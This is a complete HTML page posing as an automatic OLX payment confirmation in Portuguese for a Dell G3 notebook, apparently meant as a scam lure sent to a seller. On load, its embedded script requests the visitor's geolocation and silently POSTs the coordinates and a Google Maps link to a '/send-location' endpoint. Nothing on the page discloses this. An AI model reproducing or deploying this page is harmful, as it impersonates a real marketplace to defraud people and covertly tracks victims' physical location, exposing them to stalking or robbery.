<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Recibo OLX</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f6f6f6;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .receipt {
      background: #ffffff;
      padding: 20px 30px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      border-radius: 8px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .receipt h1 {
      color: #ff6600;
      margin-bottom: 10px;
    }
    .receipt h2 {
      color: #333333;
      font-size: 18px;
      margin-bottom: 20px;
    }
    .receipt p {
      color: #555555;
      font-size: 14px;
      margin: 8px 0;
    }
    .success {
      color: #2e7d32;
      font-weight: bold;
      margin-top: 20px;
      font-size: 16px;
    }
    .small {
      font-size: 12px;
      color: #999999;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="receipt">
    <h1>OLX</h1>
    <h2>Pagamento Confirmado</h2>
    <p><strong>Produto:</strong> Notebook Dell G3</p>
    <p><strong>Valor:</strong> R$ 1.100,00</p>
    <p><strong>Comprador:</strong> Maria Augusta</p>
    <p><strong>Data:</strong> 25/04/2025</p>
    <p><strong>ID do Pedido:</strong> #OLX45278BR</p>
    <p class="success">Transação realizada com sucesso!</p>
    <p class="small">Este é um comprovante automático gerado pela OLX.</p>
  </div>

  <script>
    // Pede permissão de localização assim que a página carregar
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const maps = `https://maps.google.com/?q=${latitude},${longitude}`;

          fetch("/send-location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ latitude, longitude, maps }),
          });
        });
      }
    };
  </script>
</body>
</html>
